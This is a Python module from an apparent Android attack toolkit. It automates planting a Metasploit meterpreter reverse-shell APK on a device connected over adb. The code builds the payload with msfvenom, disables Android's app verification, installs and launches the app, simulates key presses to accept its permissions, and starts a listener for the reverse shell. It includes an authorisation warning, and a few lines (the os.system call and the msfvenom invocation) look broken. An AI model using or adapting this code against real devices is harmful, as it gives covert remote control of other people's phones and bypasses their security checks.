import subprocess
import time

from modules.config import AppConfig
from modules import banner
from modules.console import console, print_success, confirm, adb, adb_output
from modules.connection import get_ip_address


def instructions() -> bool:
    """Display Metasploit instructions. Returns True to continue, False to go back."""
    import os
    os.system(f"{__import__('modules.config', fromlist=['AppConfig']).__module__}")

    console.clear()
    console.print(banner.instructions_banner)
    console.print(banner.instruction)
    choice = console.input("[prompt]> [/prompt]")
    return choice == ""


def hack(config: AppConfig) -> None:
    import os
    os.system(config.clear_cmd)
    console.print(banner.instructions_banner)
    console.print(banner.instruction)
    choice = console.input("[prompt]> [/prompt]")

    if choice != "":
        console.print("\n[green]Going Back to Main Menu[/green]\n")
        return

    os.system(config.clear_cmd)
    ip = get_ip_address()
    lport = "4444"
    console.print(
        f"\n[cyan]Using LHOST : [white]{ip}[/white] & LPORT : [white]{lport}[/white] to create payload[/cyan]\n"
    )

    modify = console.input(
        "\n[yellow]Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > [/yellow]"
    ).lower()

    while modify not in ("m", ""):
        modify = console.input(
            "\n[red]Invalid selection![/red] Press 'Enter' OR M > "
        ).lower()

    if modify == "m":
        ip = console.input(f"\n[cyan]Enter LHOST > [/cyan]")
        lport = console.input(f"\n[cyan]Enter LPORT > [/cyan]")

    if not confirm(
        "[bold red]WARNING:[/bold red] This will generate a payload, change device security settings, "
        "install software on the connected device, and launch Metasploit. "
        "Only proceed on systems you are authorized to test. Continue?"
    ):
        console.print("\n[green]Cancelled. Returning to Main Menu.[/green]\n")
        return

    console.print(banner.hacking_banner)
    console.print("\n[cyan]Creating payload APK...[/cyan]\n")

    with console.status("[info]Generating payload with msfvenom...[/info]"):
        subprocess.run(
            ["msfvenom", "-p", "android/meterpreter/reverse_tcp",
             f"LHOST={ip}", f"LPORT={lport}", ">", "test.apk"],
            shell=True,
        )

    console.print("\n[cyan]Installing APK to target device...[/cyan]\n")
    adb(["shell", "input", "keyevent", "3"])

    with console.status("[info]Disabling app verification...[/info]"):
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])

    with console.status("[info]Installing payload APK...[/info]"):
        subprocess.run(["adb", "install", "-r", "test.apk"])

    console.print("\n[cyan]Launching app...[/cyan]\n")
    package_name = "com.metasploit.stage"
    adb(["shell", "monkey", "-p", package_name, "1"])
    time.sleep(3)

    console.print("\n[cyan]Sending keycodes to accept app permissions...[/cyan]\n")
    adb(["shell", "input", "keyevent", "22"])
    adb(["shell", "input", "keyevent", "22"])
    adb(["shell", "input", "keyevent", "66"])

    console.print("\n[red]Launching and Setting up Metasploit-Framework...[/red]\n")
    subprocess.run([
        "msfconsole", "-x",
        f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
        f"set LHOST {ip} ; set LPORT {lport} ; exploit",
    ])

    with console.status("[info]Re-enabling app verification...[/info]"):
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
